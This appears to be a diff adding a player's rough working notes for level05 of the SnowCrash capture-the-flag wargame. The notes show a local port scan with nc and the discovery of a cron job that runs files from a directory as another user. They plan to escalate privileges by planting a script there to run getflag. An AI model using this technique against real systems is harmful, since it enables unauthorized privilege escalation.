@@ -1,0 +1,59 @@
+find / -user level05 2>/dev/null | grep -v proc
+nothing
+find / -user flag05 2>/dev/null | grep -v proc
+oh right, the openarenaserver
+level05@SnowCrash:~$ nc -z -v 127.0.0.1 1-65535 2>&1 | grep -v 'Connection refused'
+Connection to 127.0.0.1 80 port [tcp/http] succeeded!
+Connection to 127.0.0.1 4242 port [tcp/*] succeeded!
+Connection to 127.0.0.1 4646 port [tcp/*] succeeded!
+Connection to 127.0.0.1 4747 port [tcp/*] succeeded!
+Connection to 127.0.0.1 5151 port [tcp/pcrd] succeeded!
+                                        
+4646 gives me ..
+5151 gives me weird redirections
+
+-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
+https://unix.stackexchange.com/questions/92071/file-permissions-mode-ending-in-or#92072
+level05@SnowCrash:~$ getfacl /usr/sbin/openarenaserver
+getfacl: Removing leading '/' from absolute path names
+# file: usr/sbin/openarenaserver
+# owner: flag05
+# group: flag05
+user::rwx
+user:level05:r--
+group::r-x
+mask::r-x
+other::---
+
+so level05 can specifically read it?
+
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+    (ulimit -t 5; bash -x "$i")
+    rm -f "$i"
+done
+
+a file with
+touch /tmp/it_works
+creates the file, and then removes the script.
+also, I can't ls in /tmp/ but I can see the files in it :S
+
+just do getflag > /tmp/bla in a file? no
+https://bash.cyberciti.biz/monitoring/find-all-world-writable-files-directories/
+This completely halted the whole thing. I'll just continue using /tmp
+
+wut?
+level05@127.0.0.1's password:
+You have new mail.
+with su you don't see this, but with direct login you do
+
+level05@SnowCrash:~$ cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+https://unix.stackexchange.com/questions/401621/where-is-crons-path-set
+just do /bin/getflag > /tmp/bla in a file? also chmod +x ?
+also #!bash?
+
+scp /path/to/local/file.txt username@hostname:path/to/remote/destination
